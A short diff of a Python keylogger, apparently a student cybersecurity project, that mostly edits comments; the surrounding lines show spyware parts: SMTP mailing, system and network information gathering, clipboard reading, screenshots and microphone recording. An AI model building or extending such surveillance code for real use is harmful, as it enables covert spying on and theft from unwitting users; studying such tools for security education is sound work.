@@ -4,8 +4,8 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-import socket # to collect computer information
-import platform
+import socket # to collect computer network information
+import platform # to collect actual system information
 
 import win32clipboard
 
@@ -22,13 +22,11 @@ from cryptography.fernet import Fernet
 import getpass # to get username
 from requests import get
 
-from multiprocessing import Process, freeze_support # for screenshot abilities
 from PIL import ImageGrab
 
 count = 0
 keys = []
 
-username = getpass.getuser()
 
 
 file_path = "C:\\Users\\Harish\\OneDrive\\College\\cybersecurity-projects\\KEYLOGGER\\project\\"
@@ -117,7 +115,7 @@ def clipboard():
 # clipboard()
 
 def microphone():
-    sf = 44100 # sampling frequency
+    sf = 44100 # sampling frequency; 1 second = 44100 samples of audio recorded
     seconds = microphone_time # amount of seconds to record microphone
 
     myrecording = sd.rec(int(seconds * sf), samplerate = sf, channels = 2)
